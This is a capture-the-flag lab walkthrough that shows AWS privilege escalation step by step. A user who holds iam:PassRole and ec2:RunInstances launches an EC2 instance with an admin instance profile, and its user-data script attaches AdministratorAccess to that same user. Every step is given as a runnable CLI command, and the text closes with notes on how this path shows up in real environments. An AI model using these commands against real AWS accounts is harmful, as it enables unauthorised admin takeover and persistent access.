# Guided Walkthrough: One-Hop Privilege Escalation via iam:PassRole + ec2:RunInstances

This scenario demonstrates a privilege escalation vulnerability where a user has permission to pass IAM roles to EC2 instances (`iam:PassRole`) and launch EC2 instances (`ec2:RunInstances`). The attacker launches an EC2 instance with an administrative instance profile and uses the instance's user-data script to attach the `AdministratorAccess` managed policy directly to the starting user. Once the policy is attached, the attacker gains full administrator access without ever needing to assume the admin role themselves.

This technique is particularly dangerous because it combines IAM permissions with compute service actions, allowing an attacker to leverage temporary compute resources to modify persistent IAM configurations. Even though this involves multiple AWS API calls (`PassRole`, `RunInstances`, `AttachUserPolicy`), it's classified as one-hop because there is only one principal traversal: from the starting user to admin privileges via the EC2 instance as an intermediary mechanism.

The core insight is that `iam:PassRole` scoped to a powerful role is itself a privilege escalation primitive. Any service that accepts a role assignment — EC2, Lambda, ECS, Glue, and many others — becomes a potential escalation vector when combined with the ability to create resources in that service.

## The Challenge

You start as `pl-prod-ec2-001-to-admin-starting-user`, an IAM user whose credentials you have obtained. This user has a narrow set of permissions: `iam:PassRole` scoped to `pl-prod-ec2-001-to-admin-target-role` and `ec2:RunInstances` on all resources. On the surface that looks innocuous, but the target role has `AdministratorAccess`.

Your goal is to leverage those two permissions to permanently attach `AdministratorAccess` to your starting user, giving you persistent administrator access to the account.

## Reconnaissance

First, let's confirm who we are and what we can see.

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

That should return the ARN for `pl-prod-ec2-001-to-admin-starting-user`. Now confirm we don't already have admin access — listing IAM users should fail:

```bash
aws iam list-users --max-items 1
# Expected: AccessDenied
```

Good. Now let's look at what roles are passable. With `iam:ListRoles` (a helpful permission, not required) you can enumerate:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `ec2-001`)].{Name:RoleName,Arn:Arn}'
```

You'll see `pl-prod-ec2-001-to-admin-target-role`. Check the instance profiles to confirm it's wrapped in one:

```bash
aws iam list-instance-profiles --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-001`)].InstanceProfileName'
```

This returns `pl-prod-ec2-001-to-admin-instance-profile` — the instance profile you'll need to pass during `RunInstances`.

## Exploitation

The attack has two phases: launch the EC2 instance with the privileged role, and wait for the user-data script to attach the admin policy to your user.

### Phase 1: Build the user-data payload

The user-data script runs as root on first boot with access to the instance's IAM role credentials via IMDS. It will call `iam:AttachUserPolicy` on your behalf. Craft the script:

```bash
STARTING_USER="pl-prod-ec2-001-to-admin-starting-user"

USER_DATA=$(cat <<'EOF'
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

STARTING_USER_NAME="pl-prod-ec2-001-to-admin-starting-user"

# Wait for IAM role credentials to be available via IMDS
sleep 10

# Attach AdministratorAccess to the starting user using the instance's role credentials
aws iam attach-user-policy \
  --user-name "$STARTING_USER_NAME" \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached to $STARTING_USER_NAME successfully"
EOF
)
```

### Phase 2: Find the AMI and default subnet, then launch

Look up a recent Amazon Linux 2023 AMI and grab the default VPC subnet:

```bash
AWS_REGION="us-east-1"  # substitute your region

AMI_ID=$(aws ec2 describe-images \
    --region "$AWS_REGION" \
    --owners amazon \
    --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text)

DEFAULT_VPC=$(aws ec2 describe-vpcs --region "$AWS_REGION" \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' --output text)

DEFAULT_SUBNET=$(aws ec2 describe-subnets --region "$AWS_REGION" \
    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
    --query 'Subnets[0].SubnetId' --output text)
```

Now launch the instance, passing the admin instance profile:

```bash
INSTANCE_ID=$(aws ec2 run-instances \
    --region "$AWS_REGION" \
    --image-id "$AMI_ID" \
    --instance-type t3.micro \
    --iam-instance-profile Name=pl-prod-ec2-001-to-admin-instance-profile \
    --user-data "$USER_DATA" \
    --subnet-id "$DEFAULT_SUBNET" \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-ec2-001-to-admin-demo-instance},{Key=Environment,Value=demo}]' \
    --query 'Instances[0].InstanceId' \
    --output text)

echo "Launched instance: $INSTANCE_ID"
```

This is the key step — `iam:PassRole` authorizes you to assign `pl-prod-ec2-001-to-admin-instance-profile` to the instance. The instance boots with the admin role's credentials accessible via IMDS at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

### Phase 3: Wait for the user-data to execute

The user-data script runs on first boot, which takes 1-3 minutes. Poll until `AdministratorAccess` appears on your starting user:

```bash
while true; do
    RESULT=$(aws iam list-attached-user-policies \
        --user-name "$STARTING_USER" \
        --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' \
        --output text 2>/dev/null)
    if [ "$RESULT" = "AdministratorAccess" ]; then
        echo "Policy attached!"
        break
    fi
    echo -n "."
    sleep 10
done
```

## Verification

Once the loop exits, verify you have admin access by listing IAM users with your original starting user credentials (no credential change needed — the policy is attached directly to this user):

```bash
# Still using starting user credentials
aws iam list-users --max-items 3 --output table
```

If this returns a list of users, the escalation is complete. Your starting user now has `AdministratorAccess` attached as a managed policy, giving full admin access to the account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ec2-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the fact that `iam:PassRole` effectively grants the privilege level of any role you can pass. By assigning the admin role to an EC2 instance and embedding a one-shot backdoor in the user-data, you used AWS's own compute plane to make a persistent IAM change on your behalf — without ever directly calling `iam:AttachUserPolicy` from your own credentials.

In a real environment, this pattern appears when developers are given broad `iam:PassRole` for legitimate automation purposes (e.g., "they need to launch instances for our CI/CD pipeline") without realizing that scope includes high-privilege roles. The combination of `iam:PassRole` + `ec2:RunInstances` is a well-documented escalation path, but it continues to appear in production environments because the risk is non-obvious from a static policy review.
